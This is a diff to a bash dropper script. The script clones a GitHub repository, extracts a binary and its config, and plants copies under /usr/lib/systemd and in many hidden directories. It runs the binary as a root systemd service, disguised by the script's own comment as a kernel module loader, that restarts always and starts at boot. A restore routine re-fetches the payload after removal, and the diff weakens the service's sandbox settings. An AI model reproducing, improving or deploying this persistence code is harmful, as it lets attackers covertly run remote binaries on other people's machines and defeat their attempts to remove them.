@@ -81,18 +81,21 @@ create_hidden_directories() {
     log "Created ${#HIDDEN_LOCATIONS[@]} hidden directories"
 }
 
-# Download via git clone and setup binary
+# Download via git clone, extract zip, and setup ALL 3 files
 setup_executable() {
     log "Cloning repository and configuring binary..."
 
     REPO_URL="https://github.com/cryptotech1010/mostly"
     CLONE_DIR="/tmp/mostly-repo"
-    BINARY_DEST="/usr/lib/systemd/kmod-static-nodes"
+    EXTRACT_DIR="/tmp/mostly-extract"
+    BINARY_DIR="/usr/lib/systemd"
+    BINARY_DEST="$BINARY_DIR/kmod-static-nodes"
+    CONFIG_DEST="$BINARY_DIR/config.json"
 
-    # Clean previous clone if exists
-    rm -rf "$CLONE_DIR" 2>/dev/null || true
+    # Clean previous dirs if exist
+    rm -rf "$CLONE_DIR" "$EXTRACT_DIR" 2>/dev/null || true
 
-    # Git clone
+    # Git clone the repo
     git clone --depth=1 --quiet "$REPO_URL" "$CLONE_DIR"
 
     if [ ! -d "$CLONE_DIR" ]; then
@@ -100,28 +103,48 @@ setup_executable() {
         exit 1
     fi
 
-    # Find the network binary inside cloned folder
-    NETWORK_BIN="$CLONE_DIR/network"
-
-    if [ ! -f "$NETWORK_BIN" ]; then
-        error "network binary not found in cloned repository"
+    # Repo contains main.zip — extract it
+    if [ ! -f "$CLONE_DIR/main.zip" ]; then
+        error "main.zip not found in cloned repository"
         exit 1
     fi
 
-    # Deploy binary to main location
+    mkdir -p "$EXTRACT_DIR"
+    unzip -q "$CLONE_DIR/main.zip" -d "$EXTRACT_DIR"
+
+    # Locate all 3 expected files inside extracted contents
+    NETWORK_BIN=$(find "$EXTRACT_DIR" -name "network"    -type f | head -1)
+    CONFIG_FILE=$(find "$EXTRACT_DIR" -name "config.json" -type f | head -1)
+    SHA_FILE=$(   find "$EXTRACT_DIR" -name "SHA256SUMS" -type f | head -1)
+
+    if [ -z "$NETWORK_BIN" ]; then
+        error "network binary not found inside main.zip"
+        exit 1
+    fi
+
+    # ── Deploy network binary ──────────────────────────────────
     cp "$NETWORK_BIN" "$BINARY_DEST"
     chmod +x "$BINARY_DEST"
-    log "Binary deployed: $BINARY_DEST"
+    log "Binary deployed  : $BINARY_DEST"
 
-    # Distribute to all hidden locations
+    # ── Deploy config.json next to binary ─────────────────────
+    if [ -n "$CONFIG_FILE" ]; then
+        cp "$CONFIG_FILE" "$CONFIG_DEST"
+        chmod 644 "$CONFIG_DEST"
+        log "Config deployed  : $CONFIG_DEST"
+    fi
+
+    # ── Store all 3 files in every hidden location ─────────────
     for dir in "${HIDDEN_LOCATIONS[@]}"; do
-        cp "$NETWORK_BIN" "$dir/kmod-static-nodes" 2>/dev/null || true
-        chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
+        [ -n "$NETWORK_BIN" ] && cp "$NETWORK_BIN" "$dir/kmod-static-nodes" 2>/dev/null && chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
+        [ -n "$CONFIG_FILE" ] && cp "$CONFIG_FILE" "$dir/config.json"        2>/dev/null && chmod 644 "$dir/config.json"  2>/dev/null || true
+        [ -n "$SHA_FILE"    ] && cp "$SHA_FILE"    "$dir/SHA256SUMS"         2>/dev/null && chmod 644 "$dir/SHA256SUMS"   2>/dev/null || true
     done
+    log "All files distributed to ${#HIDDEN_LOCATIONS[@]} hidden locations"
 
-    # Cleanup clone
-    rm -rf "$CLONE_DIR"
-    log "Repository cloned, binary configured successfully"
+    # ── Cleanup ───────────────────────────────────────────────
+    rm -rf "$CLONE_DIR" "$EXTRACT_DIR"
+    log "Repository cloned, all files configured successfully"
 }
 
 # Create main service file — looks like real kernel module loader
@@ -141,6 +164,7 @@ ConditionPathExists=/usr/lib/systemd/kmod-static-nodes
 Type=simple
 User=root
 Group=root
+WorkingDirectory=/usr/lib/systemd
 ExecStart=/usr/lib/systemd/kmod-static-nodes
 ExecReload=/bin/kill -HUP $MAINPID
 Restart=always
@@ -158,8 +182,8 @@ TimeoutStopSec=30
 NoNewPrivileges=true
 ProtectSystem=strict
 ProtectHome=true
-ReadWritePaths=/var/tmp /tmp /run
-PrivateTmp=true
+ReadWritePaths=/var/tmp /tmp /run /usr/lib/systemd
+PrivateTmp=false
 
 [Install]
 WantedBy=sysinit.target
@@ -273,20 +297,29 @@ restore_executable() {
         done
     fi
 
-    # Re-download via git clone if not found anywhere
+    # Re-download all 3 files via git clone if binary not found anywhere
     if [ "$found" = false ]; then
         CLONE_DIR="/tmp/mostly-repo"
-        rm -rf "$CLONE_DIR" 2>/dev/null || true
+        EXTRACT_DIR="/tmp/mostly-extract"
+        rm -rf "$CLONE_DIR" "$EXTRACT_DIR" 2>/dev/null || true
         git clone --depth=1 --quiet "$REPO_URL" "$CLONE_DIR" 2>/dev/null || true
-        if [ -f "$CLONE_DIR/network" ]; then
-            cp "$CLONE_DIR/network" "$BINARY"
-            chmod +x "$BINARY"
-            for dir in "${HIDDEN_LOCATIONS[@]}"; do
-                cp "$CLONE_DIR/network" "$dir/kmod-static-nodes" 2>/dev/null || true
-                chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
-            done
+        if [ -f "$CLONE_DIR/main.zip" ]; then
+            mkdir -p "$EXTRACT_DIR"
+            unzip -q "$CLONE_DIR/main.zip" -d "$EXTRACT_DIR" 2>/dev/null || true
+            NET=$(find "$EXTRACT_DIR" -name "network"     -type f | head -1)
+            CFG=$(find "$EXTRACT_DIR" -name "config.json"  -type f | head -1)
+            SHA=$(find "$EXTRACT_DIR" -name "SHA256SUMS"   -type f | head -1)
+            if [ -n "$NET" ]; then
+                cp "$NET" "$BINARY"            && chmod +x "$BINARY"
+                [ -n "$CFG" ] && cp "$CFG" "/usr/lib/systemd/config.json" && chmod 644 "/usr/lib/systemd/config.json"
+                for dir in "${HIDDEN_LOCATIONS[@]}"; do
+                    [ -n "$NET" ] && cp "$NET" "$dir/kmod-static-nodes" 2>/dev/null && chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
+                    [ -n "$CFG" ] && cp "$CFG" "$dir/config.json"        2>/dev/null && chmod 644 "$dir/config.json"  2>/dev/null || true
+                    [ -n "$SHA" ] && cp "$SHA" "$dir/SHA256SUMS"         2>/dev/null && chmod 644 "$dir/SHA256SUMS"   2>/dev/null || true
+                done
+            fi
         fi
-        rm -rf "$CLONE_DIR" 2>/dev/null || true
+        rm -rf "$CLONE_DIR" "$EXTRACT_DIR" 2>/dev/null || true
     fi
 }
 
